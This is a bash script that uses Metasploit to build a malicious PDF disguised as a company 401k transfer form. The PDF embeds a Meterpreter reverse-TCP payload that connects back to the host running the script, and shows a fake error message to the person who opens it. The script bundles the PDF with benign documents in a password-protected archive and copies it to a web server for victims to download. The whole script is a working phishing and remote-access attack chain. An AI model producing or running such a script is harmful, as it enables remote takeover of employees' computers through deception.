#!/bin/bash

# Get the sudo password from user input
read -s -p "Enter sudo password: " SUDO_PASS
echo ""

# Generate the malicious PDF
msfconsole -q -x \
"use exploit/windows/fileformat/adobe_pdf_embedded_exe; \
set FILENAME Company_401k_transfer.pdf; \
set INFILENAME 401k-distribution-request-form.pdf; \
set LAUNCH_MESSAGE Couldn't Open PDF: Something's keeping this PDF from opening; \
set PAYLOAD windows/meterpreter/reverse_tcp; \
set LHOST "$(hostname -I | cut -d' ' -f1)"; \
set LPORT 4444; \
exploit; \
exit;"

# Generate the encrypted archive file with the malicious PDF and benign files
cp -r exit_documents Employee_package
cp Company_401k_transfer.pdf Employee_package/
7z a -p"password" Employee_package.7z Employee_package/
echo "$SUDO_PASS" | sudo -S cp Employee_package.7z /var/www/html
rm Employee_package.7z
